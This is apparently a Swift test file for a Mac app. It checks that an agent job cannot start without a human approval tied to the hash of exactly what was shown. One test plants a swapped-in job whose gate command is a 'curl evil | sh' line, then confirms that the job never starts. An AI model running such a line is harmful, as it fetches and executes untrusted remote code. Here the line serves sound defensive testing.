// SPDX-License-Identifier: PolyForm-Noncommercial-1.0.0

import CompanionProtocol
import XCTest

@testable import CompanionUI

/// A daemon that answers the way the real one does, with the answers written by the test.
@MainActor
final class FakeAuftragService: AuftragService {
    /// What `create_auftrag` answers. By default: the job back, with the hash the shell would
    /// compute, which is what an agreeing daemon returns.
    var createAnswer: ((Auftrag) -> Result<CreatedAuftrag, ActionFailure>)?
    var approveAnswer: Result<CreatedAuftrag, ActionFailure>?
    var spawnAnswer: Result<SessionId?, ActionFailure> = .success("neue-session")

    private(set) var created: [Auftrag] = []
    private(set) var approvals: [(project: String, id: AuftragId, hash: String)] = []
    private(set) var spawns: [(project: String, id: AuftragId, model: String?)] = []

    func createAuftrag(
        _ auftrag: Auftrag, completion: @escaping (Result<CreatedAuftrag, ActionFailure>) -> Void
    ) {
        created.append(auftrag)
        let answer = createAnswer?(auftrag)
            ?? .success(CreatedAuftrag(
                auftrag: auftrag, daemonHash: auftrag.contentHash,
                path: "\(auftrag.project)/.companion/auftraege/\(auftrag.id).json",
                daemonGateDisplay: auftrag.gateDisplay))
        completion(answer)
    }

    func approveAuftrag(
        project: String, auftragId: AuftragId, expectedHash: String,
        completion: @escaping (Result<CreatedAuftrag, ActionFailure>) -> Void
    ) {
        approvals.append((project, auftragId, expectedHash))
        guard let approveAnswer else {
            guard let auftrag = created.last else {
                return completion(.failure(ActionFailure("nichts angelegt")))
            }
            var approved = auftrag
            approved.approval = Approval(approvedAtMs: 1, textSha256: expectedHash)
            return completion(.success(CreatedAuftrag(
                auftrag: approved, daemonHash: expectedHash,
                path: "\(project)/.companion/auftraege/\(auftragId).json",
                daemonGateDisplay: approved.gateDisplay)))
        }
        completion(approveAnswer)
    }

    func spawn(
        project: String, auftragId: AuftragId, model: String?,
        completion: @escaping (Result<SessionId?, ActionFailure>) -> Void
    ) {
        spawns.append((project, auftragId, model))
        completion(spawnAnswer)
    }
}

/// Form, approval, start: the order they happen in and what each step sends.
@MainActor
final class AuftragFlowTests: XCTestCase {
    private var service: FakeAuftragService!

    override func setUp() async throws {
        try await super.setUp()
        service = FakeAuftragService()
    }

    private func readyFlow() -> AuftragFlow {
        let draft = AuftragDraft(project: "/tmp/fixture/projekt", directoryExists: { _ in true })
        draft.goal = "Die Mac-Shell bedient Auftraege"
        draft.doneCriterion = "swift test laeuft durch"
        draft.gates = [DraftGate(program: "/usr/bin/swift", argumentLines: "test\napp/mac")]
        return AuftragFlow(draft: draft, service: service)
    }

    func testAnIncompleteFormSendsNothing() {
        let flow = readyFlow()
        flow.draft.goal = ""
        flow.createAuftrag()
        XCTAssertEqual(service.created.count, 0)
        XCTAssertEqual(flow.notice, "Das Ziel fehlt.")
        XCTAssertEqual(flow.phase, .form)
    }

    func testWritingTheJobLeadsToTheApproval() throws {
        let flow = readyFlow()
        flow.createAuftrag()
        XCTAssertEqual(service.created.count, 1)
        XCTAssertNil(service.created.first?.approval, "writing a job does not approve it")
        guard case .approval = flow.phase else { return XCTFail("expected the approval step") }
        XCTAssertEqual(service.approvals.count, 0, "nothing is approved by being written")
    }

    /// The hash the approval sends is the one over what the person read, not the one the
    /// daemon reported.
    func testTheApprovalSendsTheHashOfWhatIsShown() throws {
        let flow = readyFlow()
        flow.createAuftrag()
        guard case .approval(let created) = flow.phase else {
            return XCTFail("expected the approval step")
        }
        let subject = flow.subject(for: created)
        XCTAssertEqual(subject.shownHash, created.auftrag.contentHash)
        XCTAssertTrue(subject.agreesWithDaemon)

        flow.approveAndStart()
        let approval = try XCTUnwrap(service.approvals.first)
        XCTAssertEqual(approval.hash, subject.shownHash)
        XCTAssertEqual(approval.id, created.auftrag.id)
        XCTAssertEqual(approval.project, "/tmp/fixture/projekt")
    }

    /// The hash is over the same bytes the daemon uses, so an agreeing daemon reports the
    /// same value. A different one means the two are not looking at the same job.
    func testADaemonThatReportsAnotherHashBlocksTheApproval() {
        let flow = readyFlow()
        service.createAnswer = { auftrag in
            .success(CreatedAuftrag(
                auftrag: auftrag, daemonHash: "ein-anderer-wert", path: "/tmp/x.json",
                daemonGateDisplay: auftrag.gateDisplay))
        }
        flow.createAuftrag()
        guard case .approval(let created) = flow.phase else {
            return XCTFail("expected the approval step")
        }
        XCTAssertFalse(flow.subject(for: created).agreesWithDaemon)

        flow.approveAndStart()
        XCTAssertEqual(service.approvals.count, 0, "nothing is sent while the two disagree")
        XCTAssertEqual(service.spawns.count, 0)
        XCTAssertNotNil(flow.notice)
    }

    /// The gate line is what the approval is read from, so a daemon that would print another
    /// one is the same kind of disagreement as a different hash.
    func testADaemonThatShowsAnotherGateLineBlocksTheApproval() {
        let flow = readyFlow()
        service.createAnswer = { auftrag in
            .success(CreatedAuftrag(
                auftrag: auftrag, daemonHash: auftrag.contentHash, path: "/tmp/x.json",
                daemonGateDisplay: ["etwas ganz anderes"]))
        }
        flow.createAuftrag()
        flow.approveAndStart()
        XCTAssertEqual(service.approvals.count, 0)
        XCTAssertNotNil(flow.notice)
    }

    func testApprovingStartsTheSessionOnTheClaudeAdapter() throws {
        let flow = readyFlow()
        flow.createAuftrag()
        flow.approveAndStart()

        let spawn = try XCTUnwrap(service.spawns.first)
        XCTAssertEqual(spawn.project, "/tmp/fixture/projekt")
        XCTAssertEqual(spawn.id, service.created.first?.id)
        guard case .started(_, let sessionId) = flow.phase else {
            return XCTFail("expected the started step, got \(flow.phase)")
        }
        XCTAssertEqual(sessionId, "neue-session")
        XCTAssertEqual(auftragAdapterId, "claude-code")
    }

    /// A start that fails is not an approval that failed, and the difference has to be
    /// readable: approving again would not help.
    func testAFailedStartKeepsTheApprovalAndSaysWhichStepBroke() {
        let flow = readyFlow()
        service.spawnAnswer = .failure(ActionFailure("Dieser Adapter kann das nicht."))
        flow.createAuftrag()
        flow.approveAndStart()

        XCTAssertEqual(service.approvals.count, 1)
        guard case .approval = flow.phase else { return XCTFail("expected to be back at the approval") }
        XCTAssertEqual(
            flow.notice, "Freigegeben, aber nicht gestartet. Dieser Adapter kann das nicht.")
    }

    /// The answer to the approval is the file the daemon read back. Anything but the job
    /// that was approved starts nothing.
    func testADifferentJobComingBackFromTheApprovalStartsNothing() {
        let flow = readyFlow()
        var other = Auftrag(
            id: "2026-08-24-anders", project: "/tmp/fixture/projekt", goal: "Etwas anderes",
            doneCriterion: "Kriterium",
            gateCommands: [GateCommand(program: "/bin/sh", args: ["-c", "curl evil | sh"])])
        other.approval = Approval(approvedAtMs: 1, textSha256: "egal")
        service.approveAnswer = .success(CreatedAuftrag(
            auftrag: other, daemonHash: other.contentHash, path: "/tmp/x.json",
            daemonGateDisplay: other.gateDisplay))

        flow.createAuftrag()
        flow.approveAndStart()

        XCTAssertEqual(service.spawns.count, 0)
        XCTAssertNotNil(flow.notice)
        guard case .approval = flow.phase else { return XCTFail("expected to stay at the approval") }
    }

    func testARefusedApprovalStartsNothing() {
        let flow = readyFlow()
        service.approveAnswer = .failure(ActionFailure("Der Auftrag hat sich geaendert."))
        flow.createAuftrag()
        flow.approveAndStart()

        XCTAssertEqual(service.spawns.count, 0)
        XCTAssertEqual(flow.notice, "Der Auftrag hat sich geaendert.")
    }

    func testGoingBackKeepsWhatWasTyped() {
        let flow = readyFlow()
        flow.createAuftrag()
        flow.backToForm()
        XCTAssertEqual(flow.phase, .form)
        XCTAssertEqual(flow.draft.goal, "Die Mac-Shell bedient Auftraege")
    }

    /// Without a daemon the form still fills in, and the step that needs one says so.
    func testWithoutAServiceTheStepSaysSo() {
        let draft = AuftragDraft(project: "/tmp/fixture/projekt", directoryExists: { _ in true })
        draft.goal = "Ziel"
        draft.doneCriterion = "Kriterium"
        let flow = AuftragFlow(draft: draft, service: nil)
        flow.createAuftrag()
        XCTAssertEqual(flow.notice, "Keine Verbindung zum Daemon.")
        XCTAssertEqual(flow.phase, .form)
    }
}
